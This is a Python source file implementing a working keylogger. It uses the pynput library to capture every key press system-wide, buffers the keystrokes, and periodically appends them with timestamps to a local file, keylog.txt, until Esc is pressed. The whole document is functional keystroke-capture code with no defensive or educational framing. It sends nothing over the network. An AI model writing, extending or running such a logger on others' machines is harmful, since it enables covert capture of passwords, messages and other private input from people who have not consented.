from pynput import keyboard
from datetime import datetime
import threading
import time

class BufferedKeyLogger:
    def __init__(self, log_file="keylog.txt", flush_interval=60):
        self.log_file = log_file
        self.buffer = []
        self.flush_interval = flush_interval # how often we save to disk -> faster solution because saves the data on disk once every 60 seconds (default)
        self.is_running = False
        self.listener = None
        pass

    def start(self):
        self.is_running = True

        # start the keyboard listener
        self.listener = keyboard.Listener(
            on_press=self._on_press,
            on_release=self._on_release
        )

        self.listener.start()

        # start auto-save thread
        self.save_thread = threading.Thread(target=self._auto_save, daemon=True)
        self.save_thread.start()
        print(f"Logger started. Auto-saving every {self.flush_interval} seconds.")

    def _on_press(self, key):
        try:
            self.buffer.append(key.char)
        except AttributeError:
            self.buffer.append(self._translate_special_key(key))

    def _translate_special_key(self, key):
        special_keys = {
            keyboard.Key.space : " ",
            keyboard.Key.enter : "\n",
            keyboard.Key.tab : "\t",
            keyboard.Key.backspace : "canc",
        }
        return special_keys.get(key, f"[{key}]")

    def _on_release(self, key):
        if key == keyboard.Key.esc:
            self.stop()
            return False
        
    def _auto_save(self):
        """ periodically save buffer to file """
        while(self.is_running):
            time.sleep(self.flush_interval)
            self._flush_buffer()

    def _flush_buffer(self):
        """ Write buffer contents to file """
        if self.buffer:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            with open(self.log_file, "a") as f:
                f.write(f"[{timestamp}]")
                f.write("".join(self.buffer))
                f.write("\n---\n")
            self.buffer.clear()
            print(f"Buffer flushed at {timestamp}")

    def stop(self):
        """ stop logging and save remaining buffer """
        self._flush_buffer()
        self.is_running = False
        if self.listener:
            self.listener.stop()
        print("Logger stopped. Final data saved ")

if __name__ == "__main__":
    logger = BufferedKeyLogger(flush_interval=10)
    logger.start()

    try:
        while logger.is_running:
            time.sleep(1)
    except KeyboardInterrupt:
        logger.stop()
